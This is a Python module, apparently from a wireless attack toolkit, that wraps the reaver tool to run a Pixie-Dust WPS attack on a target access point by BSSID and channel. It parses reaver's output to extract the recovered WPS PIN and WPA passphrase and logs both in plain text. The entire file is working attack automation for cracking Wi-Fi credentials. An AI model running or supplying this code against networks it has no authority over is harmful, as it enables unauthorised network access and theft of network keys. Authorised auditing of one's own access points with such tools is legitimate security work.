"""Sidewinder WPS Vulnerability Scanner.

Scans a target for WPS status and attempts to identify
Pixie-Dust vulnerabilities using Reaver/Bully logic or beacon parsing.
"""
import asyncio
import logging
import shutil
from typing import Any

from ..core.attack import BaseAttackEngine, AttackConfig, AttackResult, AttackState
from ..core.subprocess_mgr import SubprocessManager

logger = logging.getLogger(__name__)


class WPSEngine(BaseAttackEngine):
    """Engine for testing WPS vulnerabilities (Pixie-Dust/PIN bruteforce)."""

    def __init__(self, mgr: SubprocessManager) -> None:
        super().__init__()
        self.mgr = mgr
        self._proc: asyncio.subprocess.Process | None = None

    async def start(self, config: AttackConfig, **kwargs: Any) -> AttackResult:
        """Launch Reaver or OneShot to test WPS Pixie-Dust."""
        iface = kwargs.get("iface")
        if not iface:
            return AttackResult(False, ["No interface provided for WPS attack."])
        if shutil.which("reaver") is None:
            return AttackResult(False, ["reaver is not installed or not in PATH."])

        self.state = AttackState.RUNNING
        logger.info("Starting WPS attack on %s (BSSID: %s)", iface, config.target_bssid)
        await self._emit_progress(status="Initializing WPS attack...")

        cmd = [
            "reaver",
            "-i", iface,
            "-b", config.target_bssid,
            "-c", str(config.channel),
            "-K", "1",  # Pixie-Dust mode
            "-q"        # Quiet mode
        ]

        found_pin = None
        found_psk = None
        errors: list[str] = []
        timeout = float(kwargs.get("timeout", config.timeout))

        await self._emit_progress(status="Running Reaver Pixie-Dust...")

        def parse_line(line: str) -> None:
            nonlocal found_pin, found_psk
            if "WPS PIN:" in line:
                found_pin = line.split("WPS PIN:", 1)[1].strip().strip("'")
            elif "WPA PSK:" in line:
                found_psk = line.split("WPA PSK:", 1)[1].strip().strip("'")

        async def read_pipe(pipe, label: str) -> None:
            if pipe is None:
                return
            async for line_b in pipe:
                if self.state != AttackState.RUNNING:
                    break
                line = line_b.decode(errors="replace").strip()
                if not line:
                    continue
                parse_line(line)
                await self._emit_progress(status=f"WPS {label}: {line[-48:]}")
                if found_pin and found_psk:
                    await self.stop()
                    break

        try:
            self._proc = await self.mgr.start_background(cmd, capture_output=True)
            read_task = asyncio.gather(
                read_pipe(self._proc.stdout, "out"),
                read_pipe(self._proc.stderr, "err"),
            )
            wait_task = asyncio.create_task(self._proc.wait())
            done, pending = await asyncio.wait(
                {read_task, wait_task},
                timeout=timeout,
                return_when=asyncio.FIRST_COMPLETED,
            )
            if not done:
                errors.append(f"Reaver timed out after {int(timeout)}s")
                await self._emit_progress(status=errors[-1])
            for task in pending:
                task.cancel()
        except Exception as e:
            errors.append(str(e))
            logger.debug("WPS read error: %s", e)

        await self.stop()

        success = bool(found_psk)
        stats = {"wps_pin": found_pin, "wpa_psk": found_psk}

        if success:
            logger.info("WPS Attack SUCCESS! PIN: %s | PSK: %s", found_pin, found_psk)
        else:
            logger.info("WPS Attack failed or AP is not vulnerable.")

        return AttackResult(success=success, errors=errors, stats=stats)

    async def stop(self) -> None:
        """Stop the WPS attack."""
        if self._proc and self._proc.returncode is None:
            self._proc.terminate()
            try:
                await asyncio.wait_for(self._proc.wait(), timeout=5)
            except asyncio.TimeoutError:
                self._proc.kill()
        self._proc = None
        self.state = AttackState.COMPLETED
